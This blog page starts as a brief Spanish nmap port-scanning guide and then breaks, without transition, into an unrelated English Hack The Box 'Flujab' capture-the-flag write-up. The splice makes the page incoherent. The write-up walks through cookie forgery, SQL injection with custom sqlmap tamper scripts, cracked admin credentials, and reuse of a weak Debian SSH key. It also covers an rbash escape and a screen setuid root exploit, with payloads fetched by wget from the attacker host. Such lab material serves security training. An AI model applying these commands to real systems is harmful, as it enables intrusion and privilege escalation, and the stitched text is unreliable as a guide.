---
layout: single
title: Nmap - Guia de uso nmap
excerpt: "Guia basica de uso de la herramienta nmap."
date: 2021-08-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-flujab/nmap-logo.png
categories:
  -nmap
tags:  
  - nmap
  - enumeration
---
Esta es una guia basica de la herramienta nmap esta herramienta sirve para el escaneo de puertos.
Pagina de github oficial de nmap:
https://github.com/nmap/nmap



## Uso de nmap 

### Scaneo de puertos basico

Este escaneo no es recomendado solo es un ejemplo basico del uso de nmap (todos estos comandos se usan desde la terminal)

```
nmap (ip)
```

Ejemplo:
```
nmap 143.0.13.4
```

## Uso de nmap con parametros
### Parametros de nmap 
Nmap ocupa parametros para funcionar existe una gran variedad de parametros en esta guia se veran algunos de ellos.
### Parametro -p-
Ete parametro escanea todo el rango de puertos disponibles (65536 puertos).
```
nmap -p- (ip)
```
### Parametro -p
Este parametro se usa para "apuntar" a un puerto en especifico 
```
nmap -p 80 (ip)
```
Tambien se puede usar para un rango de puertos en especifico
```
nmap -p 10-80 (ip)
```


### Useless websites and trolling

**bestmedsupply.htb**

![](/assets/images/htb-writeup-flujab/bestmedsupply.png)

**chocolateriver.htb**

![](/assets/images/htb-writeup-flujab/chocolateriver.png)

**custoomercare.megabank.htb**

![](/assets/images/htb-writeup-flujab/custoomercare.png)

**flowerzrus.htb**

![](/assets/images/htb-writeup-flujab/flowerzrus.png)

**meetspinz.htb**

![](/assets/images/htb-writeup-flujab/meetspinz.png)

**rubberlove.htb**

![](/assets/images/htb-writeup-flujab/rubberlove.png)

**vaccine4flu.htb**

![](/assets/images/htb-writeup-flujab/vaccine4flu.png)

**console.flujab.htb**

![](/assets/images/htb-writeup-flujab/console.png)

### Non-functional SMTP website

The `smtp.flujab.htb` website contains a login form, this looks very interesting... Or not as it turns out.

![](/assets/images/htb-writeup-flujab/smtp_fake.png)

I thought there was a SQL injection of some sort on there but I quickly saw that the form doesn't do anything when you click to sign in. When we look at the code, we can see that it's badly broken and doesn't do anything when we submit the form.

![](/assets/images/htb-writeup-flujab/smtp_code1.png)

![](/assets/images/htb-writeup-flujab/smtp_code2.png)

The `api` call shown above is missing the closing parantheses, plus other functions are missing such as shown_modal_error(). This whole code is basically useless. I tried fuzzing the site to find a hidden API endpoint but didn't find any.

I found a `/README` file on the site that confirmed that this site is no longer used:

```
   -------------------------------------
   This Service has been decommissioned!
   -------------------------------------

Administrators can now use the configuration 
section of the new free service application.
```

Let's move on to the  `freeflujab.htb` site.

### Enumerating the real target website

The **freeflujab.htb** website is an healthcare information site about the Flu where patients can register, book, cancel or send a reminder for appoinments.

![](/assets/images/htb-writeup-flujab/freeflujab1.png)

![](/assets/images/htb-writeup-flujab/freeflujab2.png)

**Registration: `?reg`**

The registration doesn't work when registering a user, we can an error message about a connection error to the mailserver. The website errors out when it tries to send an email after the registration.

![](/assets/images/htb-writeup-flujab/freeflujab_reg1.png)

![](/assets/images/htb-writeup-flujab/freeflujab_reg2.png)

**Booking: `?book`**

The booking page also doesn't work for us because we don't have a valid patient name to book an appointment.

![](/assets/images/htb-writeup-flujab/freeflujab_book1.png)

![](/assets/images/htb-writeup-flujab/freeflujab_book2.png)

**Cancel: `?cancel`**

We can't get to the cancelation page as it redirects us to `?ERROR=NOT_REGISTERED` automatically.

![](/assets/images/htb-writeup-flujab/freeflujab_cancel1.png)

The next thing I did was check the cookies I had since the registration status must be stored in a session on the server-side or in a client cookie.

![](/assets/images/htb-writeup-flujab/freeflujab_cookies1.png)

The content of the `Modus` and `Registered` cookies are simply Base64 encoded:

- Modus: `Q29uZmlndXJlPU51bGw%3D` = `Configure=Null`
- Patient: `ea879301202391042cd783affa29f92a` = 
- Registered: `ZWE4NzkzMDEyMDIzOTEwNDJjZDc4M2FmZmEyOWY5MmE9TnVsbA%3D%3D` = `ea879301202391042cd783affa29f92a=Null`

By changing the `Registered` cookie to `ea879301202391042cd783affa29f92a=True`, we are able to access the cancelation page:

![](/assets/images/htb-writeup-flujab/freeflujab_cancel2.png)

But we get the same SMTP error message when trying to cancel an appointment:

![](/assets/images/htb-writeup-flujab/freeflujab_cancel3.png)

Then I noticed in the cookies that there is a cookie set for the `/?smtp_config` path. If we try to connect to it, we get redirected to `https://freeflujab.htb/?denied`. But if we change the `Configure=Null` cookie value to `Configure=True` we are able to access the SMTP configuration page.

![](/assets/images/htb-writeup-flujab/freeflujab_smtpconfig1.png)

We can't set the server address to our own IP address:

![](/assets/images/htb-writeup-flujab/freeflujab_smtpconfig2.png)

But the validation is performed client-side so we can just use Burp to change the `smtp.flujab.htb` value for our IP address:

![](/assets/images/htb-writeup-flujab/freeflujab_smtpconfig3.png)

![](/assets/images/htb-writeup-flujab/freeflujab_smtpconfig4.png)

There's also a link to see the whitelisted sysadmins but we get a denied redirection when we click on it. The problem is the `Configure=True` cookie has been set to the `/?smtp_config` path. If we change the path of the cookie to `/` we can access the whitelist page.

![](/assets/images/htb-writeup-flujab/freeflujab_whitelist1.png)

Changing the SMTP server address adds our IP address automatically to the whitelist. Later this same whitelist is used to allow access to the web administation panel so if the box gets reverted, we need to go back to the SMTP configuration page and change the SMTP server address again otherwise our IP can't access the admin panel.

**Remind: `?remind`**

The last useful link on the page is used to send appointment reminders.

![](/assets/images/htb-writeup-flujab/freeflujab_remind1.png)

Now that we have configured a valid SMTP address, we can send a reminder (we can choose any NHS number, it doesn't need to exist in the database)... But we get an error message:

![](/assets/images/htb-writeup-flujab/freeflujab_remind2.png)

The form doesn't contain an email address field, but we can intercept the request with Burp and add it ourselves:

![](/assets/images/htb-writeup-flujab/freeflujab_remind3.png)

We can use the python smtpd module to run an SMTP server in Kali and receive the email:

![](/assets/images/htb-writeup-flujab/freeflujab_remind4.png)

### SQL injection

The email itself doesn't contain anything useful, so the next step is to fuzz the `nhsnum` input and look for an SQL injection. Instead of doing it manually through Burp, I made a quick script to speed up the process. 

```python
#!/usr/bin/python

import requests
from pwn import *
import time

while True:
    cmd = raw_input(">").strip()

    headers = {
        "Cookie": "Patient=ea879301202391042cd783affa29f92a;Registered=ZWE4NzkzMDEyMDIzOTEwNDJjZDc4M2FmZmEyOWY5MmE9VHJ1ZQ==",
    }

    data = {
        "nhsnum": "{}".format(cmd),
        "email": "test@test.com",
        "submit": "Send+Reminder"   
    }

    proxies = {
    'http': 'http://127.0.0.1:8080',
    'https': 'http://127.0.0.1:8080',
    }

    before = time.time()
    r = requests.post(url="https://freeflujab.htb/?remind", headers=headers, data=data, verify=False, proxies=proxies)
    after = time.time()
    delta = after-before
    print("Response time: {}".format(delta))
```

After fuzzing for a bit, I found a UNION based injection where the `Ref:` field in the subject header contains the return value from the 3rd column.

![](/assets/images/htb-writeup-flujab/sql1.png)

I wanted to use sqlmap to enumerate the database but I had a problem since sqlmap doesn't "see" the responses from the queries since they come by email through the SMTP server. So what I did was create a small script to pipe the content of `Ref:` field in the Subject header to a file in my Apache server root directory:

```python
from datetime import datetime
import asyncore
import re
from smtpd import SMTPServer

class EmlServer(SMTPServer):
    no = 0
    def process_message(self, peer, mailfrom, rcpttos, data):
        filename = '/var/www/html/test.txt'
        f = open(filename, 'w')
        buf = data.splitlines()
        for line in buf:
                # print line 
            if 'Ref:' in line:  
                print line.split('Ref:')[1]
                f.write(line.split('Ref:')[1])
            f.close
        print 'Message %d, %s saved.' % (self.no, filename)
        self.no += 1

def run():
    foo = EmlServer(('10.10.14.23', 25), None)
    try:
        asyncore.loop()
    except KeyboardInterrupt:
        pass


if __name__ == '__main__':
    run()
```

Then I used the `--second-url` option in sqlmap to make it check my local webserver for the query reponse. I added a tamper script first in the chain so it wipes the content of the reponse file, so that if the query errors out on the server it doesn't cause a false positive.

**delete.py**

```python
def tamper(payload, **kwargs):
    retVal = payload
    f = open('/var/www/html/test.txt', 'w')
    f.write('')
    f.close()
    sleep(0.5)
    return retVal
```    

I then used the following sqlmap command: `sqlmap --threads 1 -r /root/htb/flujab/flujab.req --risk=3 -p nhsnum --random-agent --proxy=http://127.0.0.1:8080 --second-url http://127.0.0.1/test.txt --tamper delete --force-ssl --technique u --union-cols 5 --union-char 1 -vv --suffix " #" --dbms=mysql --flush-session`

But I had problems getting sqlmap working correctly, for some reason even when I gave it the correct number of columns it didn't find the injection point.

![](/assets/images/htb-writeup-flujab/sql2.png)

Then I remembered that on some of the webpages there was a `Protected By ClownWare.htb` message at the bottom. So I figured there was a WAF messing with some of the parameters sent to the server.

After playing with the queries manually, I found that `ALL`, `0x` and `CASE` keywords are modified by the server:

![](/assets/images/htb-writeup-flujab/sql3.png)

![](/assets/images/htb-writeup-flujab/sql4.png)

![](/assets/images/htb-writeup-flujab/sql5.png)

For the `ALL` and `0x` statements, I used the `unionalltounion` and `0x2char` tamper scripts already included in sqlmap but for `CASE` I made my own script to replace it with an `IF` statement:

**case.py**

```python
def tamper(payload, **kwargs):
    retVal = payload
    if payload:
        retVal = retVal.replace("CASE WHEN", "IF(")
        retVal = retVal.replace("THEN 1 ELSE 0 END", ",1,0)")
    return retVal
```

The final sqlmap command is: `sqlmap --threads 1 -r /root/htb/flujab/flujab.req --risk=3 -p nhsnum --random-agent --proxy=http://127.0.0.1:8080 --second-url http://127.0.0.1/test.txt --tamper delete --force-ssl --technique u --union-cols 5 --union-char 1 -vv --suffix " #" --dbms=mysql --tamper unionalltounion --tamper 0x2char --tamper case`

It's not fast but after a few minutes it found the injection point:

![](/assets/images/htb-writeup-flujab/sql6.png)

Now that we have the injection working in sqlmap, I was able to dump the list of databases:

```
[*] information_schema
[*] MedStaff
[*] mysql
[*] openmrs
[*] performance_schema
[*] phplist
[*] vaccinations
```

The `vaccinations` database contains the following tables:

```
+------------------------+
| user                   |
| admin                  |
| admin_attribute        |
| admin_password_request |
| adminattribute         |
| admintoken             |
| eventlog               |
[...]
```

I dumped the `admin` table and found some credentials and a vhost that I previously didn't have: `sysadmin-console-01.flujab.htb`

![](/assets/images/htb-writeup-flujab/sql7.png)

The hash was easily cracked with john and rockyou.txt:

- sysadm / th3doct0r

### Access to the SMTP configuration page

The admin panel is running the Ajenti application:

![](/assets/images/htb-writeup-flujab/webadmin1.png)

We can log in with the `sysadm` credentials we found in the database, and we can use the Notepad tool to read & write files:

![](/assets/images/htb-writeup-flujab/webadmin2.png)

The `/home/drno` folder contains two interesting files in the `.ssh` directory:

![](/assets/images/htb-writeup-flujab/webadmin3.png)

The `userkey` file contains an encrypted SSH private key that we can crack with ssh2john / john (password: shadowtroll) but we can't use it because it doesn't match the `authorized_keys` file. `authorized_keys` contains a hint about whitelisting but other than that it doesn't seem possible to exploit this since we don't have the matching private key.

```
# shell whitelisting + key auth enabled 
ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAgEAqTfCP9e71pkBY+uwbr+IIx1G1r2G1mcjU5GsA42OZCWOKhWg2VNg0aAL+OZLD2YbU/di+cMEvdGZNRxCxaBNtGfMZTTZwjMNKAB7sJFofSwM29SHhuioeEbGU+ul+QZAGlk1x5Ssv+kvJ5/S9vUESXcD4z0jp21CxvKpCGI5K8YfcQybF9/v+k/KkpDJndEkyV7ka/r/IQP4VoCMQnDpCUwRCNoRb/kwqOMz8ViBEsg7odof7jjdOlbBz/F9c/s4nbS69v1xCh/9muUwxCYtOxUlCwaEqm4REf4nN330Gf4I6AJ/yNo2AH3IDpuWuoqtE3a8+zz4wcLmeciKAOyzyoLlXKndXd4Xz4c9aIJ/15kUyOvf058P6NeC2ghtZzVirJbSARvp6reObXYs+0JMdMT71GbIwsjsKddDNP7YS6XG+m6Djz1Xj77QVZbYD8u33fMmL579PRWFXipbjl7sb7NG8ijmnbfeg5H7xGZHM2PrsXt04zpSdsbgPSbNEslB78RC7RCK7s4JtroHlK9WsfH0pdgtPdMUJ+xzv+rL6yKFZSUsYcR0Bot/Ma1k3izKDDTh2mVLehsivWBVI3a/Yv8C1UaI3lunRsh9rXFnOx1rtZ73uCMGTBAComvQY9Mpi96riZm2QBe26v1MxIqNkTU03cbNE8tDD96TxonMAxE=
```

However after looking for a bit, I found the `/etc/ssh/deprecated_keys` directory that contains the following files:

![](/assets/images/htb-writeup-flujab/webadmin4.png)

README.txt has the following message:
```
Copies of compromised keys will be kept here for comparison until all staff 
have carried out PAM update as per the surgery security notification email.

!!! DO NOT RE-USE ANY KEYS LINKED TO THESE !!! 


UPDATE..
All bad priv keys have now been deleted, only pub keys are retained 
for audit purposes.
```

I remember from my OSCP days that there was a vulnerability in an old Debian release where:

> All SSL and SSH keys generated on Debian-based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected.

[Debian OpenSSL Predictable PRNG](https://github.com/g0tmi1k/debian-ssh)

So basically we just need to look through the repo and find the matching private key for DrNo's public key.

Getting the public key fingerprint:

```
root@ragingunicorn:~/htb/flujab# ssh-keygen -l -E md5 -f 5.pub | tr -d ":"
4096 MD5dead0b5b829ea2e3d22f47a7cbde17a6 drno@flujab.htb (RSA)
```

Finding the matching private key:

```
root@ragingunicorn:~/debian-ssh# ls -lR | grep dead0b5b829ea2e3d22f47a7cbde17a6
-rw------- 1 root root 3239 May 14  2008 dead0b5b829ea2e3d22f47a7cbde17a6-23269
-rw-r--r-- 1 root root  740 May 14  2008 dead0b5b829ea2e3d22f47a7cbde17a6-23269.pub

root@ragingunicorn:~/debian-ssh# find ./ -name dead0b5b829ea2e3d22f47a7cbde17a6-23269
./uncommon_keys/rsa/4096/dead0b5b829ea2e3d22f47a7cbde17a6-23269
```

We still can't connect to the SSH service though, we need to fix that first. The `/etc/ssh/sshd_wl` file is a whitelist that can be modified so we can add our IP address.

![](/assets/images/htb-writeup-flujab/webadmin5.png)

We can then log in with private key from `drno`:

```
root@ragingunicorn:~/debian-ssh/uncommon_keys/rsa/4096# ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@10.10.10.124
Linux flujab 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
rbash: dircolors: command not found
drno@flujab:~$ cat user.txt
c519aa...
```

### Privesc

We seem to be stuck in a rbash restricted shell, we need to escape that first:

```
drno@flujab:~$ ls -l/
user.txt
drno@flujab:~$ cat user.txt
c519aa...
drno@flujab:~$ cd ..
rbash: cd: restricted
```

Escape is easy with `-t bash --norc --noprofile`:

```
root@ragingunicorn:~/debian-ssh/uncommon_keys/rsa/4096# ssh -i dead0b5b829ea2e3d22f47a7cbde17a6-23269 drno@10.10.10.124 -t bash --norc --noprofile
bash-4.4$ cd /
bash-4.4$ ps
  PID TTY          TIME CMD
 1151 pts/0    00:00:00 bash
 1152 pts/0    00:00:00 ps
bash-4.4$ whoami
drno
bash-4.4$ id
uid=1000(drno) gid=1000(drno) groups=1000(drno),1002(super),1003(medic),1004(drugs),1005(doctor)
```

Two copies of the screen program were found on the system, the 2nd one is suid so it will execute as root.

```
bash-4.4$ ls -l /usr/bin/screen
-rwSr-xr-x 1 root utmp 457608 Dec  9 22:02 /usr/bin/screen
bash-4.4$ ls -l /usr/local/share/screen/screen
-rwsr-xr-x 1 root root 1543016 Nov 27 13:49 /usr/local/share/screen/screen
```

> 'S' = setgid bit is set, but the execute bit isn't set.
> 's' = setgid bit is set, and the execute bit is set.

After checking the version, there is an exploit available for screen:

```
bash-4.4$ /usr/local/share/screen/screen --version
Screen version 4.05.00 (GNU) 10-Dec-16
```

[https://www.exploit-db.com/exploits/41154](https://www.exploit-db.com/exploits/41154)

First, we'll just compile the exploit:

```
root@ragingunicorn:/tmp# gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c
```

Next, we upload it to the server:

```
bash-4.4$ cd /tmp
bash-4.4$ wget 10.10.14.23:4444/rootshell
--2019-01-30 03:27:16--  http://10.10.14.23:4444/rootshell
Connecting to 10.10.14.23:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16824 (16K) [application/octet-stream]
Saving to: ‘rootshell’

rootshell                                              16.43K  --.-KB/s    in 0.008s  

2019-01-30 03:27:16 (2.05 MB/s) - ‘rootshell’ saved [16824/16824]

bash-4.4$ wget 10.10.14.23:4444/libhax.so
--2019-01-30 03:27:25--  http://10.10.14.23:4444/libhax.so
Connecting to 10.10.14.23:4444... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16136 (16K) [application/octet-stream]
Saving to: ‘libhax.so’

libhax.so                                              15.76K  --.-KB/s    in 0.008s  

2019-01-30 03:27:25 (1.94 MB/s) - ‘libhax.so’ saved [16136/16136]

bash-4.4$ chmod +x rootshell
```

Then execute it:

```
bash-4.4$ chmod +x rootshell
bash-4.4$ cd /etc
bash-4.4$ umask 000
bash-4.4$ screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
Directory '/run/screen' must have mode 755.
bash-4.4$ screen -ls
Directory '/run/screen' must have mode 755.
bash-4.4$ /tmp/rootshell
$
```

Uh? No root privileges?

Oh... I forgot to use the correct binary in `/usr/local/share/screen` which is setuid. Let's try again with the right path:

```
bash-4.4$ /usr/local/share/screen/screen -D -m -L ld.so.preload echo -ne  "\x0a/tmp/libhax.so"
bash-4.4$ /usr/local/share/screen/screen -ls
No Sockets found in /tmp/screens/S-drno.

bash-4.4$ /tmp/rootshell
# id
uid=0(root) gid=0(root) groups=0(root),1000(drno),1002(super),1003(medic),1004(drugs),1005(doctor)
# cat /root/root.txt
70817...
```
